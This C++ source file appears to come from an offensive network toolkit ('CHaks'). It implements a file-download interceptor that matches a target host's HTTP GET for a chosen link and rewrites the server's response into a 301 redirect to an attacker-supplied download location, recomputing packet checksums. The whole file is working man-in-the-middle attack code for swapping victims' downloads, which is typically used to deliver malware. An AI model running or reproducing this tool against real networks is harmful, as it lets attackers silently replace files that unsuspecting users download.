#include "FileInterceptor.h"

#include <iostream>
#include <stdlib.h>
#include <cstring>
#include <poll.h>
#include <arpa/inet.h>

CHaks::FileInterceptor::FileInterceptor() :
    requestAckNum(0),
    requestFiltered(FALSE)
{

}

CHaks::FileInterceptor::~FileInterceptor()
{
    
}

int CHaks::FileInterceptor::Run(const int socketFd, const char* interfaceName, const uint32_t ipVersion, const char* targetIP, 
    const char* downloadLink, const char* newDownloadLink)
{
    pollfd pollFds[2]{};
        
    // we want to monitor console input, entering something there stops the program
    pollFds[0].fd = 0;
    pollFds[0].events = POLLIN;

    pollFds[1].fd = socketFd;
    pollFds[1].events = POLLIN;

    PacketCraft::Packet httpRequestPacket;
    PacketCraft::Packet httpResponsePacket;

    std::cout << "waiting for packets... press enter to stop\n" << std::endl;

    while(true)
    {
        int nEvents = poll(pollFds, sizeof(pollFds) / sizeof(pollFds[0]), -1);
        if(nEvents == -1)
        {
            LOG_ERROR(APPLICATION_ERROR, "poll() error!");
            return APPLICATION_ERROR;
        }
        else if(nEvents == 0)
        {
            LOG_ERROR(APPLICATION_ERROR, "poll() timeout!");
            return APPLICATION_ERROR;
        }
        else
        {
            if(pollFds[0].revents & POLLIN)
            {
                std::cout << "quitting...\n";
                return NO_ERROR;
            }
            else if(pollFds[1].revents & POLLIN)
            {                
                if(FilterRequest(socketFd, ipVersion, targetIP, downloadLink, httpRequestPacket) == NO_ERROR)
                {
                    requestFiltered = TRUE;
                }

                if(requestFiltered == TRUE)
                {
                    if(FilterResponse(socketFd, ipVersion, targetIP, httpResponsePacket) == NO_ERROR)
                    {
                        std::cout << "response before modifying:\n";
                        httpResponsePacket.Print();

                        ModifyResponse(httpResponsePacket, newDownloadLink);

                        std::cout << "response after modifying:\n";
                        httpResponsePacket.Print();
                    }
                }
            }
        }
    }
}

int CHaks::FileInterceptor::FilterRequest(const int socketFd, const uint32_t ipVersion, const char* targetIP, const char* downloadLink, PacketCraft::Packet& httpRequestPacket)
{
    if(httpRequestPacket.Receive(socketFd, 0) == APPLICATION_ERROR)
    {
        // LOG_ERROR(APPLICATION_WARNING, "PacketCraft::Packet::Receive() error");
        return APPLICATION_WARNING;
    }

    char* httpRequest = (char*)httpRequestPacket.FindLayerByType(PC_HTTP_REQUEST);
    if(httpRequest != nullptr)
    {
        if(PacketCraft::GetHTTPMethod((uint8_t*)httpRequest) == PC_HTTP_GET)
        {
            // check that IP matches the desired target
            if(ipVersion == AF_INET)
            {
                sockaddr_in targetIPAddr{};
                if(inet_pton(AF_INET, targetIP, &targetIPAddr.sin_addr) == -1)
                {
                    LOG_ERROR(APPLICATION_ERROR, "inet_pton() error");
                    return APPLICATION_ERROR;
                }

                IPv4Header* ipv4Header = (IPv4Header*)httpRequestPacket.FindLayerByType(PC_IPV4);
                if(ipv4Header->ip_src.s_addr != targetIPAddr.sin_addr.s_addr)
                    return APPLICATION_WARNING;
            }
            else
            {
                sockaddr_in6 targetIPAddr{};
                if(inet_pton(AF_INET6, targetIP, &targetIPAddr.sin6_addr) == -1)
                {
                    LOG_ERROR(APPLICATION_ERROR, "inet_pton() error");
                    return APPLICATION_ERROR;
                }

                IPv6Header* ipv6Header = (IPv6Header*)httpRequestPacket.FindLayerByType(PC_IPV6);
                if(memcmp(ipv6Header->ip6_src.__in6_u.__u6_addr8, targetIPAddr.sin6_addr.__in6_u.__u6_addr8, IPV6_ALEN) != 0)
                    return APPLICATION_WARNING;
            }
            ////////////////////

            char packetFileName[255]{};
            char packetDomainName[255]{};
            char packetDownloadLink[1024]{};

            char buffer[255]{};

            // Copy the first line of the http request in buffer. Should be something like this: "GET /test/file.php HTTP/1.1"
            PacketCraft::CopyStrUntil(buffer, sizeof(buffer), httpRequest, '\n');

            int filePathStartIndex = 4;
            int filePathEndIndex = PacketCraft::FindInStr(buffer, " HTTP");
            memcpy(packetFileName, buffer + filePathStartIndex, filePathEndIndex - filePathStartIndex);
            memset(buffer, '\0', sizeof(buffer));
            packetFileName[filePathEndIndex] = '\0';

            // Copy the line containing the host domain name in buffer. Should be something like this: "Host: example.test.com"
            PacketCraft::CopyStrUntil(buffer, sizeof(buffer), httpRequest + PacketCraft::FindInStr(httpRequest, "Host: "), '\n');

            int domainStartIndex = 6;
            int domainEndIndex = PacketCraft::FindInStr(buffer, "\r\n");
            memcpy(packetDomainName, buffer + domainStartIndex, domainEndIndex - domainStartIndex);
            memset(buffer, '\0', sizeof(buffer));
            packetDomainName[domainEndIndex] = '\0';

            PacketCraft::ConcatStr(packetDownloadLink, sizeof(packetDownloadLink), packetDomainName, packetFileName);

            if(PacketCraft::CompareStr(packetDownloadLink, downloadLink) == TRUE)
            {
                TCPHeader* tcpHeader = (TCPHeader*)httpRequestPacket.FindLayerByType(PC_TCP);
                if(tcpHeader == nullptr)
                {
                    LOG_ERROR(APPLICATION_ERROR, "PacketCraft::Packet::FindLayerByType() error");
                    return APPLICATION_ERROR;
                }

                // valid request found
                requestAckNum = tcpHeader->ack_seq;
                return NO_ERROR;
            }
        }
    }

    return APPLICATION_WARNING;
}

int CHaks::FileInterceptor::FilterResponse(const int socketFd, const uint32_t ipVersion, const char* targetIP, PacketCraft::Packet& httpResponsePacket)
{
    if(httpResponsePacket.Receive(socketFd, 0) == APPLICATION_ERROR)
    {
        // LOG_ERROR(APPLICATION_WARNING, "PacketCraft::Packet::Receive() error");
        return APPLICATION_WARNING;
    }

    char* httpResponse = (char*)httpResponsePacket.FindLayerByType(PC_HTTP_RESPONSE);
    if(httpResponse != nullptr)
    {
        if(PacketCraft::GetHTTPMethod((uint8_t*)httpResponse) == PC_HTTP_SUCCESS)
        {
            // check that IP matches the desired target
            if(ipVersion == AF_INET)
            {
                sockaddr_in targetIPAddr{};
                if(inet_pton(AF_INET, targetIP, &targetIPAddr.sin_addr) == -1)
                {
                    LOG_ERROR(APPLICATION_ERROR, "inet_pton() error");
                    return APPLICATION_ERROR;
                }

                IPv4Header* ipv4Header = (IPv4Header*)httpResponsePacket.FindLayerByType(PC_IPV4);
                if(ipv4Header->ip_dst.s_addr != targetIPAddr.sin_addr.s_addr)
                    return APPLICATION_WARNING;
            }
            else
            {
                sockaddr_in6 targetIPAddr{};
                if(inet_pton(AF_INET6, targetIP, &targetIPAddr.sin6_addr) == -1)
                {
                    LOG_ERROR(APPLICATION_ERROR, "inet_pton() error");
                    return APPLICATION_ERROR;
                }

                IPv6Header* ipv6Header = (IPv6Header*)httpResponsePacket.FindLayerByType(PC_IPV6);
                if(memcmp(ipv6Header->ip6_dst.__in6_u.__u6_addr8, targetIPAddr.sin6_addr.__in6_u.__u6_addr8, IPV6_ALEN) != 0)
                    return APPLICATION_WARNING;
            }
            ////////////////////

            TCPHeader* tcpHeader = (TCPHeader*)httpResponsePacket.FindLayerByType(PC_TCP);
            if(tcpHeader == nullptr)
            {
                LOG_ERROR(APPLICATION_ERROR, "could not find tcp layer");
                return APPLICATION_ERROR;
            }

            // response matching the original request found
            if(tcpHeader->seq == requestAckNum)
                return NO_ERROR;
        }
    }

    return APPLICATION_WARNING;
}

int CHaks::FileInterceptor::ModifyResponse(PacketCraft::Packet& httpResponse, const char* newDownloadLink) const
{
    const char* httpStatusCode = "HTTP/1.1 301 Moved Permanently\r\nLocation: ";
    uint32_t responseCodeLen = PacketCraft::GetStrLen(httpStatusCode) + PacketCraft::GetStrLen(newDownloadLink) + 1;
    char* fullHTTPCode = (char*)malloc(responseCodeLen);
    PacketCraft::ConcatStr(fullHTTPCode, responseCodeLen, httpStatusCode, newDownloadLink);

    httpResponse.DeleteLayer(httpResponse.GetNLayers() - 1);
    httpResponse.AddLayer(PC_HTTP_RESPONSE, responseCodeLen);
    memcpy(httpResponse.GetLayerStart(httpResponse.GetNLayers() - 1), fullHTTPCode, responseCodeLen);

    httpResponse.CalculateChecksums();

    free(fullHTTPCode);
    return NO_ERROR;
}